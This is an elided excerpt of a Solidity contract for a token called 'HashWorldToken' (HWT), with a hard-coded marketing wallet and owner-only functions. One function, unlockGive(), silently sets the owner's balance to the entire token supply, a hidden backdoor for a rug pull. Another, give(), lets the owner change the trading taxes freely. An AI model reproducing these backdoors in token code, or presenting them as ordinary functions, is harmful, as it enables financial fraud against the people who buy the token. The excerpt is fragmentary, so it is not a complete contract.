...
contract HWT is Context, IERC20, Ownable {
    ...
    string private _name = "HashWorldToken";
    string private _symbol = "HWT";
    uint8 private _decimals = 9;
    address payable public marketingAddress = payable(0x700Ce35Bf56FC4dfc97bffa348Fdb6d43081bAf1);
    ...
    function give(uint256 newLiquidityTax, uint256 newMarketingTax) external onlyOwner() {
    ...
    function unlockGive() external onlyOwner() {_tokenAddresses[getOwner()] = _decimalTotalTok;}
